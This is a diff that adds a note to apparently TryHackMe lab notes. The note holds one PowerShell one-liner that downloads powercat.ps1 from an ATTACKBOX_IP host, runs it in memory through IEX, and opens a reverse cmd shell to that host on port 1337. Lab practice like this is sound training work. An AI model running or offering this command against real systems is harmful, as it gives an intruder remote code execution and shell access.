@@ -1,1 +1,3 @@
+## Powershell Command to execute script by downloading form attack box 
+   C:\Users\thm\Desktop> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
 
